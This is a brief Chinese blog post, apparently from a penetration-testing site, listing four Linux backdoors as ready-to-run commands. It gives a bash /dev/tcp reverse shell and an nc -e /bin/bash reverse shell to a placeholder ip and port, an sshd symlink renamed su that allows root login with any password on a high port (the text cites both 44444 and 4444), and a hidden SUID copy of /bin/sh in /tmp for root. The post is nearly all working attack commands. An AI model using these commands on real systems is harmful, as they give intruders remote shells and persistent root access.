---
title: "Linux 的几种后门"
date: 2018-01-26T00:00:00+08:00
draft: false
author: "X1r0z"

tags: ['linux']
categories: ['内网渗透']

hiddenFromHomePage: false
hiddenFromSearch: false

toc:
  enable: true
math:
  enable: false
lightgallery: false
---

Linux 的 bash nc ssh SUID 后门

<!--more-->

### bash

`bash -i >& /dev/tcp/ip/port 0>&1`

### nc

`nc ip port -e /bin/bash`

nc 可以从源码编译.

`./configure --prefix=/tmp/nc && make && make install`

### ssh 后门

`ln -sf /usr/sbin/sshd /tmp/su;/tmp/su -oPort=44444;`

连接 4444 用 root/bin/ftp/mail 当用户名 密码随意.

### SUID 后门

执行用户会获得该文件所有者的权限.

`cp /bin/sh /tmp/.shell && chmod 4755 /tmp/.shell`

执行 /tmp/.shell -p 即可获得 root 权限.